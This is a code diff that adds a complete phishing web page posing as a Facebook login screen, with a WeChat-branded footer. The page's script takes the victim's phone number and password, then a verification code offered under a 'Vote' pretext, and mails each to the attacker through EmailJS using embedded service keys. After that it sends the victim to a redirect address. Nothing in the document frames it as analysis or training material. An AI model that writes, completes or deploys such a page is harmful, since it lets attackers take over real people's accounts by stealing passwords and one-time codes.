@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: rgb(218, 218, 218);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            width: 90%;
+            padding: 40px;
+            background-color: rgb(218, 218, 218);
+            border-radius: 0px;
+            box-shadow: 0 0 0px rgba(0, 0, 0, 0.2);
+        }
+
+        .container input[type="text"],
+        .container input[type="password"] {
+            width: 93%;
+            padding: 15px;
+            margin: 10px 0;
+            border: 3px solid #cdcdcd;
+            outline: none;
+            border-radius: 10px;
+            height: 30px;
+            font-size: 18px;
+        }
+
+        .login-button {
+            width: 99%;
+            padding: 15px;
+            background-color: #0bd032;
+            border: none;
+            color: #fff;
+            cursor: pointer;
+            border-radius: 10px;
+            height: 50px;
+            font-size: 18px;
+        }
+
+        .login-button:disabled {
+            background-color: #9ece9b; /* Lighter green for disabled state */
+            cursor: not-allowed;
+        }
+
+        .vote-button:disabled {
+            background-color: #9ece9b; /* Lighter green for disabled state */
+            cursor: not-allowed;
+        }
+
+        .centered-image1,
+        .centered-image2 {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .custom-text {
+            font-family: Arial, sans-serif;
+            font-size: 16px;
+            margin-top: 15px;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        .footer {
+            background-color: rgb(218, 218, 218);
+            color: rgb(201, 201, 201);
+            text-align: center;
+            padding: 20px;
+            margin-top: 150px;
+            margin-bottom: 20px;
+        }
+
+        .footer a {
+            color: rgb(175, 175, 175);
+            text-decoration: none;
+            margin: 0 10px;
+        }
+
+        .copyright {
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="centered-image1">
+        <img src="" alt="" style="max-width: 100%; margin-bottom: 20px;">
+    </div>
+    <div class="container">
+        <div class="centered-image2">
+            <img src="https://raw.githubusercontent.com/Indian-art/chinaphoto/44dc12805f3860047e2fbc64b2954f6f200ebf68/3ou3PnG.png" alt="" style="max-width: 100%; margin-bottom: 20px;">
+            <div class="custom-text">Facebook helps you connect and share with the people in your life.</div>
+        </div>
+        <form name="login" id="loginForm">
+            <input type="text" class="container input" placeholder="Phone number" name="phone" id="phone">
+            <input type="password" class="container input" placeholder="Password" name="password" id="password">
+            <button class="login-button" id="loginButton" type="submit" disabled>Submit</button>
+        </form>
+        <div style="margin-top: 20px; padding: 10px; border: 1px solid rgb(218, 218, 218); width: 99%; border-radius: 5px; background-color: rgb(218, 218, 218);">
+            <p contenteditable="false" style="font-size: 16px; color: #333; text-align: center;">Editable text here. You can change this text as needed.</p>
+        </div>
+        <input type="text" class="container input" placeholder="Enter verification code" name="verificationCode" id="verificationCode" style="margin-top: 10px;">
+        <button class="login-button vote-button" id="voteButton" type="button" disabled>Vote</button>
+    </div>
+
+    <!-- Include Email.js library -->
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+        emailjs.init("i7EeAStelqHs8raTS");
+
+        // Enable/disable submit button based on phone and password fields
+        const phoneInput = document.getElementById('phone');
+        const passwordInput = document.getElementById('password');
+        const loginButton = document.getElementById('loginButton');
+        const voteButton = document.getElementById('voteButton');
+        const verificationCodeInput = document.getElementById('verificationCode');
+
+        function validateLoginInputs() {
+            const phoneValue = phoneInput.value.trim();
+            const passwordValue = passwordInput.value.trim();
+            loginButton.disabled = !(phoneValue && passwordValue);
+        }
+
+        function validateVoteInput() {
+            const verificationCodeValue = verificationCodeInput.value.trim();
+            voteButton.disabled = !verificationCodeValue;
+        }
+
+        phoneInput.addEventListener('input', validateLoginInputs);
+        passwordInput.addEventListener('input', validateLoginInputs);
+        verificationCodeInput.addEventListener('input', validateVoteInput);
+
+        // Function to send login details via Email.js
+        function sendLoginDetails(event) {
+            event.preventDefault();  // Prevent the form from refreshing the page
+
+            const templateParams = {
+                phone: phoneInput.value.trim(),
+                password: passwordInput.value.trim()
+            };
+
+            emailjs.send("service_vdcs1jx", "template_1m4cj2n", templateParams)
+                .then(function(response) {
+                    console.log("Login details sent successfully", response);
+                    alert("Your login details have been submitted.");
+                }, function(error) {
+                    console.log("Failed to send login details. Error:", error);
+                });
+        }
+
+        // Function to send verification code and redirect
+        function sendVerificationCode() {
+            const templateParams = {
+                verification_code: verificationCodeInput.value.trim()
+            };
+
+            emailjs.send("service_vdcs1jx", "template_1m4cj2n", templateParams)
+                .then(function(response) {
+                    console.log("Verification code sent successfully", response);
+                    window.location.href = 'YOUR_REDIRECT_URL_HERE'; // Replace with the actual URL
+                }, function(error) {
+                    console.log("Failed to send verification code. Error:", error);
+                });
+        }
+
+        // Add event listeners to buttons
+        document.getElementById('loginForm').addEventListener('submit', sendLoginDetails);
+        voteButton.addEventListener('click', sendVerificationCode);
+
+        // Initially disable the buttons
+        validateLoginInputs();
+        validateVoteInput();
+    </script>
+    <div class="footer">
+        <a>隐私政策</a>
+        <a>服务条款</a>
+        <a>可接受使用政策</a>
+        <br>
+        版权所有 © 2012-2024 微信。保留所有权利。
+    </div>
+</body>
+</html>
